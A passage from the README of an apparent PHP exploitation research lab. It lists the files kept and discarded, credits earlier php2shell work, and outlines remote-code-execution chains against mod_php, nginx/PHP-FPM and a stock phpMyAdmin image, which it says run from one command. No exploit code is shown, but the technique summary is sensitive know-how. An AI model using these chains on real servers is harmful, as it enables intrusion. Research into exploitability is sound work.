(`calif-php2shell.html/.txt`), the superseded 8094 three-stage `full_rce.py` and
the `off_rce.py` that needed raised `max_input_vars`/`max_multipart_body_parts`
with now-stale offsets, the one-shot `off_a*.py` / `measure_def_ab.py` calibration
drivers and the ~50 `gdb-*.txt` terminal captures, the bare-metal probes the FPM
chain was first measured with (the direct-to-9000 `fcgi.py`, `bg_fpm.py` and the
`gdb-bg*.py` set — their conclusions are baked into `exploits/fpm_rce.py` as
constants, and its containerised HTTP environment was rewritten as
`docker/Dockerfile.fpm` + `docker/fpm/`), and every `out-*` run artifact.
Kept: the seven PoC scripts (four mod_php + the two nginx/PHP-FPM calibrations, the
second of which covers both a single worker and a pool via `WORKERS`, + the one that
attacks the upstream phpMyAdmin image) plus the
vendored reference `exploit.py`, the gdb-driven measurement scripts that document *how*
each constant was obtained, and the four `gdb-*.py` scripts those drivers load.

All three chains ship in this repository and each is one command away: mod_php under
"The chain (1)" (`exploit off` and friends), nginx + PHP-FPM under "The chain (2)"
(`exploit fpm` / `exploit fpm128` / `exploit fpm4`), the upstream product image under
"The chain (3)" (`exploit pma`).

## Acknowledgements

* [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
  — the origin of this work.  The idea that a mod_php request can bail out on an
  OOM *after* the session is initialised and still be talked into an out-of-bounds
  `Set-Cookie` leak, that the leak carries both the Zend MM chunk base and the
  `libphp.so` base (which is what kills ASLR here), and that
  `session.upload_progress` + `PHP_SESSION_UPLOAD_PROGRESS` is the allocation site
  to aim the fake `zend_reference` at — all of that is theirs, as is the minimal
  `<?php echo "OK\n"; ?>` attack surface and the A1/B1/A2/B2 stage structure.
  `exploits/exploit.py` in this tree is their chain, vendored as the reference
  implementation (only the two paths inside this tree were fixed).  Without that
  project nothing here would exist.
* The Calif Research php2shell write-up (calif.io) — the direction of the FPM
  chain comes from it: PHP-FPM's pre-RINIT session decode leaves a dangling
  `BG(unserialize)` decoder.  Turning that into a pure-HTTP, one-command
  nginx + PHP-FPM exploit — the three-step push calibration, the choice of write
  target, scaling the pressure with empty-filename parts so PHP's stock 128M limit is
  fillable, arming a whole worker pool through the round-robin, the container and rebuild
  flow — is this tree's work.  Carrying it into a third shape — the untouched upstream
  product image `phpmyadmin/phpmyadmin:5.2.3-fpm` (stock 512M / 2048K /
  `use_strict_mode=On` / dynamic pool, a 100 MB session file accumulated across requests,
  the write path forged out of the victim's own 880 KB of session content) — builds on
  the same calibration direction; what this tree added there is folding it into the
  one-click lab, the single-file PoC, and re-measuring the `ps_files` / `AIM_U` this
  image actually uses on a twin container of our own.
* The PHP bug itself (the session UAF behind the bailout) is upstream's; this lab
  is research into its exploitability, run against our own containers.

## License / responsible use

Everything here targets containers created by this lab on `127.0.0.1`.  Use it
only against systems you own or are authorised to test.
